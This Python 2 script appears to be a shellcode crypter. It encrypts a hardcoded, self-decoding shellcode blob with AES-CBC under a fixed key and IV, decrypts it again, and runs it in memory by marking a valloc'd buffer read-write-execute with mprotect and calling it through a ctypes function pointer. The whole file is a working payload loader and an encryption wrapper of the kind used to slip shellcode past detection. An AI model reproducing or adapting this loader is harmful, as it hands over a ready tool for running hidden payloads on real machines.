import ctypes
from Crypto.Cipher import AES

# Encrypt shellcode
def encrypt(key, shellcode, IV):

   formatted = ""

   aes = AES.new(key, AES.MODE_CBC, IV)

   encrypted = aes.encrypt(shellcode)

   for i in encrypted:
       formatted += "\\x" + i.encode("hex")

   print "Encrypted shellcode:\n%s\n" % formatted

   return encrypted

# Decrypt shellcode
def decrypt(key, shellcode, IV):

   formatted = ""

   obj = AES.new(key, AES.MODE_CBC, IV)

   decrypted = obj.decrypt(shellcode)

   for i in decrypted:
       formatted += "\\x" + i.encode("hex")

   print "Decrypted shellcode:\n%s\n" % formatted

   return decrypted

# Execute shellcode
def exec_shellcode(shellcode, shellcode_len):
   libc = ctypes.CDLL('libc.so.6')

   p_shellcode = ctypes.c_char_p(shellcode)

   p_address = ctypes.c_void_p(libc.valloc(shellcode_len))

   ctypes.memmove(p_address, p_shellcode, shellcode_len)

   libc.mprotect(p_address, shellcode_len, 0x7)

   run = ctypes.cast(p_address, ctypes.CFUNCTYPE(ctypes.c_void_p))

   print "Executing shellcode:\n"
   run()


def main():

   # Define shellcode
   shellcode = "\xeb\x0c\x5e\x80\x06\x0a\x46\x80\x3e\x0a\x74\x07\xeb\xf5\xe8\xef\xff\xff\xff\x27\xb6\x46\x5e\x64\x25\x69\x5e\x5e\x25\x25\x58\x5f\x7f\xd9\x46\x7f\xd8\x49\x7f\xd7\xa6\x01\xc3\x76\x0a"

   # Define key (ensure divisible by 16)
   key = "1234abcd5678efgh"

   # Define IV (ensure divisible by 16)
   IV = "1029103810471056"

   # Printing original shellcode
   formatted = ""
   for i in shellcode:
       formatted += "\\x" + i.encode("hex")
   print "Original shellcode:\n%s\n" % formatted

   # Pad shellcode if necessary to ensure length is divisible by 16
   if (len(shellcode) % 16 != 0):
      shellcode += "\x90" * (16 - (len(shellcode) % 16))

   # Encrypt the shellcode
   encrypted = encrypt(key, shellcode, IV)

   # Decrypt the shellcode
   decrypted = decrypt(key, encrypted, IV)

   # Execute the shellcode
   exec_shellcode(decrypted, len(decrypted))

main()
